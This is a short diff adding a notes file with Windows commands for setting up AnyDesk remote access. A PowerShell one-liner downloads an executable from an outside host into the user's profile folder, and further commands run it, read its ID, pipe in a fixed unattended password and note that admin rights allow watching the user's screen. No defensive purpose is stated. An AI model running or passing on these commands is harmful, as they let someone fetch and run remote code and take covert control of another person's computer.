@@ -1,0 +1,10 @@
+C:\Users\Benjamin\AppData\Roaming\AnyDesk\system.conf -> id
+
+powershell "& {$url='http://altiscraft.fr/a.exe';$c=new-object System.Net.WebClient;$c.DownloadFile($url,'C:\Users\%username%\a.exe')}"
+cd C:\Users\%username%\ & a.exe
+cd C:\Users\%username%\ & a.exe --get-id
+cd C:\Users\%username%\ & echo vDDt4P26 | a.exe --set-password // require admin (and be the user at the same time to see his screen)
+/!\ do not use « for the pw /!\
+
+Proc name: AnyDesk.exe
+
